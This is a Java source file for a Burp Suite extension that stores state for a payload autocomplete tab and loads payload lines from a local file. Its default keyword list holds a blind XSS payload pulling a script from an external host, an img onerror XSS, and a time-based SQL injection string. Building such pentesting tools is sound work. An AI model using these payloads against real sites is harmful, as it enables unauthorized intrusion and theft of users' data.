package com.staticflow;

import burp.IBurpExtenderCallbacks;

import java.io.BufferedReader;
import java.io.FileReader;
import java.io.IOException;
import java.util.ArrayList;
import java.util.Arrays;

/*
This stores our state for the extension as a Singleton
 */
class ExtensionState {

    //State object
    private static ExtensionState instance = null;
    //Burp callbacks
    private IBurpExtenderCallbacks callbacks;
    //UI panel
    private final AutoCompleterTab autoCompleterTab;
    public String filePath = "D:\\App\\burpsuite_pro_v2.0.11beta1\\autocomplete\\BurpSuiteAutoCompletion\\payloads.txt";
    //Starting List of Header keywords
    //Seclist headers list https://raw.githubusercontent.com/danielmiessler/SecLists/master/Miscellaneous/web/http-request-headers/http-request-headers-fields-large.txt
    public ArrayList<String> keywords = new ArrayList<>(Arrays.asList(
    		"xss'><script src=https://lamscun.xss.ht></script>",
    		"xss ><img src=x onerror=alert(1)>",
    		"sql '-sleep(10) -- -"
    	));
    //List of current text areas
    private ArrayList<AutoCompleter> listeners = new ArrayList<>();


    /**
     * Generate the singleton
     */
    public ExtensionState() {
        autoCompleterTab = new AutoCompleterTab();
        keywords.clear();
//        keywords.addAll(setKeyWordsFromFile(filePath));
        System.out.println("File path:");
        System.out.println(autoCompleterTab.getFileName());
        keywords.addAll(setKeyWordsFromFile(autoCompleterTab.getFileName()));
        for(String keyword : keywords){
            autoCompleterTab.addKeywordToList(keyword);
        }
    }
    public ArrayList<String> setKeyWordsFromFile(String filename) {
    	
    	ArrayList<String> arrListPayloads = new ArrayList<>();
		
    	BufferedReader reader;
		try {
			reader = new BufferedReader(new FileReader(filename));
			String line = reader.readLine();
			while (line != null) {
				System.out.println(line);
				// read next line
				arrListPayloads.add(line);
				line = reader.readLine();
				
			}
			reader.close();
		} catch (IOException e) {
			e.printStackTrace();
		}
		
		return arrListPayloads;
	}
    /**
     * Set burp callbacks
     * @param callbacks the callbacks
     */
    static void setCallbacks(IBurpExtenderCallbacks callbacks) {
        getInstance().callbacks = callbacks;
    }

    /**
     * Get the burp callback object
     * @return bur callback object
     */
    IBurpExtenderCallbacks getCallbacks() {
        return getInstance().callbacks;
    }

    /**
     * Get UI object
     * @return our custom UI tab
     */
    AutoCompleterTab getAutoCompleterTab() {
        return getInstance().autoCompleterTab;
    }

    /**
     * Get a handle to this state object
     * @return this state object
     */
    static ExtensionState getInstance() {
        if(instance==null) {
            instance = new ExtensionState();
        }
        return instance;
    }

    /**
     * Get the current list of autocomplete words
     * @return the current list of autocomplete words
     */
    ArrayList<String> getKeywords() {
        return getInstance().keywords;
    }

    /**
     * Get the current list of document listeners
     * @return the current list of document listeners
     */
    ArrayList<AutoCompleter> getListeners() {
        return getInstance().listeners;
    }

    /**
     * Add a new listener to the current list of document listeners
     */
    void addListener(AutoCompleter autoCompleter) {
        getInstance().listeners.add(autoCompleter);
    }

}